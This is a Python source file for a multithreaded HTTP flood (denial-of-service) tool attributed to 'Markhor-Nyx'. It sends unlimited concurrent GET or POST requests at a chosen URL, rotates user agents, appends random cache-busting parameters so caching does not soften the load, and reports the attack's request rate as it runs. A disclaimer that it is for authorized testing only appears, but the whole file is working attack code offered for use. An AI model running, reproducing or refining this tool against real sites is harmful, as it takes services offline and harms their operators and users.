import requests
import threading
import time
import random
import argparse
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import colorama

# --- Configuration & Globals ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    # Add more user agents
]

# Event to signal threads to stop
stop_event = threading.Event()

# Statistics dictionary
stats = {
    "sent": 0,
    "successful_2xx": 0, # 200-299
    "redirects_3xx": 0,  # 300-399
    "client_errors_4xx": 0, # 400-499
    "server_errors_5xx": 0, # 500-599
    "connection_errors": 0,
    "timeout_errors": 0,
    "other_errors": 0,
    "lock": threading.Lock()
}

# Initialize Colorama
colorama.init(autoreset=True)

# --- Helper Functions ---
def print_banner():
    print(colorama.Fore.MAGENTA + """
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S            
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S            
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O            S:::::S
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS
""")
    print(colorama.Fore.CYAN + "             --- Advanced HTTP Flooder Tool ---")
    print(colorama.Fore.BLUE + "                 Developed by: Markhor-Nyx")
    print(colorama.Fore.BLUE + "         Copyright (C) Markhor-Nyx. All rights reserved.")
    print(colorama.Fore.RED + "\n========================= WARNING! =========================")
    print(colorama.Fore.YELLOW + "This tool is for EDUCATIONAL AND AUTHORIZED TESTING ONLY.")
    print(colorama.Fore.YELLOW + "Using this tool against systems without explicit permission is ILLEGAL.")
    print(colorama.Fore.YELLOW + "You are solely responsible for your actions.")
    print(colorama.Fore.RED + "==========================================================\n")

def update_stat(key, count=1):
    with stats["lock"]:
        stats[key] += count

def add_cache_bust(url_string):
    """Adds a random query parameter to a URL to try and bypass caches."""
    parsed_url = urlparse(url_string)
    query_params = parse_qs(parsed_url.query)
    query_params['markhor_bust'] = [str(random.randint(10000, 99999))] # Unique enough
    new_query_string = urlencode(query_params, doseq=True)
    return urlunparse(parsed_url._replace(query=new_query_string))

# --- Attack Functions ---
def http_flood_worker(target_url, method, session, rps_per_thread, post_data=None, request_timeout=10):
    inter_request_delay = 1.0 / rps_per_thread if rps_per_thread > 0 else 0
    
    while not stop_event.is_set():
        try:
            user_agent = random.choice(USER_AGENTS)
            headers = {'User-Agent': user_agent}
            
            final_url = add_cache_bust(target_url) if method == "GET" else target_url

            response = None
            if method == "GET":
                response = session.get(final_url, headers=headers, timeout=request_timeout)
            elif method == "POST":
                # For POST, allow content-type to be inferred by requests or set explicitly if needed
                # headers['Content-Type'] = 'application/x-www-form-urlencoded' # or 'application/json'
                response = session.post(final_url, headers=headers, data=post_data, timeout=request_timeout)
            else:
                # Should not happen if validation is correct
                print(colorama.Fore.RED + f"Unsupported method: {method}")
                break 

            update_stat("sent")
            
            if 200 <= response.status_code < 300:
                update_stat("successful_2xx")
            elif 300 <= response.status_code < 400:
                update_stat("redirects_3xx")
            elif 400 <= response.status_code < 500:
                update_stat("client_errors_4xx")
            elif 500 <= response.status_code < 600:
                update_stat("server_errors_5xx")
            
            if inter_request_delay > 0:
                time.sleep(inter_request_delay)

        except requests.exceptions.Timeout:
            update_stat("timeout_errors")
        except requests.exceptions.ConnectionError:
            update_stat("connection_errors")
        except requests.exceptions.RequestException:
            update_stat("other_errors")
        except Exception: # Catch any other unexpected error in thread
            update_stat("other_errors")
            # Potentially log this for debugging
            pass

# --- Statistics Display ---
def display_stats_periodically(total_duration, interval=1):
    start_time = time.time()
    last_sent_count = 0
    
    while not stop_event.wait(timeout=interval):
        elapsed_time = time.time() - start_time
        if elapsed_time == 0: elapsed_time = 1 # Avoid division by zero at the very start
        
        with stats["lock"]:
            current_sent_count = stats["sent"]
            
            # Calculate RPS based on the interval
            interval_rps = (current_sent_count - last_sent_count) / interval
            last_sent_count = current_sent_count

            # Overall average RPS
            overall_avg_rps = current_sent_count / elapsed_time
            
            remaining_time = total_duration - elapsed_time if total_duration > 0 else float('inf')
            progress_char = "█"
            empty_char = "░"
            
            if total_duration > 0:
                progress_percent = (elapsed_time / total_duration) * 100
                progress_bar_len = 30
                filled_len = int(progress_bar_len * progress_percent / 100)
                bar = progress_char * filled_len + empty_char * (progress_bar_len - filled_len)
                progress_str = f"[{bar}] {progress_percent:.1f}% | Left: {remaining_time:.0f}s"
            else:
                progress_str = f"Running indefinitely... Elapsed: {elapsed_time:.0f}s"

            sys.stdout.write(
                colorama.Fore.YELLOW + \
                f"\r{progress_str} | RPS (current): {interval_rps:<7.2f} | RPS (avg): {overall_avg_rps:<7.2f} | "
                f"Sent: {stats['sent']:<7} | 2xx: {stats['successful_2xx']:<5} | 3xx: {stats['redirects_3xx']:<4} | "
                f"4xx: {stats['client_errors_4xx']:<4} | 5xx: {stats['server_errors_5xx']:<4} | "
                f"ConnErr: {stats['connection_errors']:<5} | Timeout: {stats['timeout_errors']:<5} | Other: {stats['other_errors']:<4}" + \
                colorama.Style.RESET_ALL
            )
            sys.stdout.flush()
        
        if total_duration > 0 and elapsed_time >= total_duration:
            break # Duration reached
            
    print() # Newline after stats loop finishes

def print_final_stats(start_time):
    total_time = time.time() - start_time
    if total_time == 0: total_time = 1 # Avoid division by zero
    
    print(colorama.Fore.GREEN + "\n--- Attack Finished ---")
    print(f"Total Duration: {total_time:.2f} seconds")
    with stats["lock"]:
        print(f"Total Requests Sent: {stats['sent']}")
        print(f"Avg. Requests Per Second (RPS): {(stats['sent'] / total_time):.2f}")
        print(colorama.Fore.CYAN + "Response Summary:")
        print(f"  Successful (2xx): {stats['successful_2xx']}")
        print(f"  Redirects  (3xx): {stats['redirects_3xx']}")
        print(f"  Client Errors (4xx): {stats['client_errors_4xx']}")
        print(f"  Server Errors (5xx): {stats['server_errors_5xx']}")
        print(colorama.Fore.RED + "Error Summary:")
        print(f"  Connection Errors: {stats['connection_errors']}")
        print(f"  Timeout Errors: {stats['timeout_errors']}")
        print(f"  Other Errors: {stats['other_errors']}")
    print("-----------------------")

# --- Main Execution ---
def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description="Advanced HTTP Flooder by Markhor-Nyx. Use responsibly.",
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("target", help="Target URL (e.g., http://example.com/path)")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of concurrent threads (default: 20)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration of the attack in seconds (0 for indefinite) (default: 60)")
    parser.add_argument("-r", "--rps", type=int, default=0, help="Approximate Requests Per Second PER THREAD (0 for max speed) (default: 0)")
    parser.add_argument("-m", "--method", type=str, default="GET", choices=["GET", "POST"], help="HTTP method to use (GET or POST) (default: GET)")
    parser.add_argument("-p", "--postdata", type=str, help="Data for POST requests (e.g., 'key1=value1&key2=value2' or JSON string if Content-Type is set).")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")

    args = parser.parse_args()

    # Validate URL
    if not (args.target.startswith("http://") or args.target.startswith("https://")):
        print(colorama.Fore.RED + "Error: Target URL must start with 'http://' or 'https://'.")
        sys.exit(1)
    try:
        parsed_url_check = urlparse(args.target)
        if not parsed_url_check.netloc:
            raise ValueError("Missing domain in URL")
    except ValueError as e:
        print(colorama.Fore.RED + f"Error: Invalid target URL format. {e}")
        sys.exit(1)

    if args.threads <= 0:
        print(colorama.Fore.RED + "Error: Number of threads must be positive.")
        sys.exit(1)
    if args.duration < 0:
        print(colorama.Fore.RED + "Error: Duration cannot be negative.")
        sys.exit(1)
    if args.rps < 0:
        print(colorama.Fore.RED + "Error: RPS cannot be negative.")
        sys.exit(1)
    if args.timeout <= 0:
        print(colorama.Fore.RED + "Error: Request timeout must be positive.")
        sys.exit(1)

    if args.method == "POST" and not args.postdata:
        # Allow empty POST if user intends, but warn or prompt? For now, just proceed.
        # print(colorama.Fore.YELLOW + "Warning: POST method selected but no postdata provided. Sending empty POST body.")
        pass # Allow empty POST


    print(colorama.Fore.GREEN + f"Target: {args.target}")
    print(f"Method: {args.method}")
    if args.method == "POST" and args.postdata:
        print(f"POST Data: {args.postdata[:50]}{'...' if len(args.postdata)>50 else ''}") # Show truncated data
    print(f"Threads: {args.threads}")
    print(f"Duration: {'Infinite' if args.duration == 0 else str(args.duration) + 's'}")
    print(f"RPS per Thread: {'Max' if args.rps == 0 else str(args.rps)}")
    print(f"Request Timeout: {args.timeout}s")

    confirmation = input(colorama.Fore.RED + "\nARE YOU SURE you want to launch this attack? (yes/no): ").lower()
    if confirmation != 'yes':
        print(colorama.Fore.YELLOW + "Attack cancelled by user.")
        sys.exit(0)

    print(colorama.Fore.MAGENTA + "\nStarting attack...")
    
    # Create a session for all threads
    session = requests.Session()
    # Optionally configure session adapters for retry strategy, pool size etc.
    # adapter = requests.adapters.HTTPAdapter(pool_connections=args.threads, pool_maxsize=args.threads*2)
    # session.mount('http://', adapter)
    # session.mount('https://', adapter)

    threads_list = []
    attack_start_time = time.time()

    # Start statistics display thread
    stats_thread = threading.Thread(target=display_stats_periodically, args=(args.duration, 1)) # Update stats every 1 second
    stats_thread.daemon = True
    stats_thread.start()

    # Start worker threads
    for i in range(args.threads):
        thread = threading.Thread(target=http_flood_worker, 
                                  args=(args.target, args.method, session, args.rps, args.postdata, args.timeout))
        thread.daemon = True # Threads will exit when main program exits (after stop_event)
        thread.start()
        threads_list.append(thread)
        # print(f"Thread {i+1} started.") # Can be too verbose

    try:
        # Keep main thread alive for the duration or until Ctrl+C
        # The display_stats_periodically function will handle breaking if duration is met
        # If duration is 0, this will run indefinitely until Ctrl+C
        if args.duration > 0:
            # Wait for duration, but allow stop_event to break it early (e.g. Ctrl+C)
            stop_event.wait(timeout=args.duration)
        else:
            while not stop_event.is_set(): # Indefinite duration, wait for Ctrl+C
                time.sleep(0.1) # Keep main thread alive, responsive to Ctrl+C

    except KeyboardInterrupt:
        print(colorama.Fore.YELLOW + "\n[!] Ctrl+C detected. Signaling threads to stop...")
    finally:
        stop_event.set() # Signal all threads to stop
        
        print(colorama.Fore.CYAN + "\nWaiting for worker threads to finish (max 2s)...")
        for t in threads_list:
            t.join(timeout=2) # Give threads a moment to finish current request and exit loop

        # Wait for stats thread to finish its last print
        if stats_thread.is_alive():
            stats_thread.join(timeout=1.5) # It should see stop_event and exit

        session.close() # Close the requests session
        print_final_stats(attack_start_time)
        print(colorama.Fore.MAGENTA + "Tool finished.")

if __name__ == "__main__":
    main()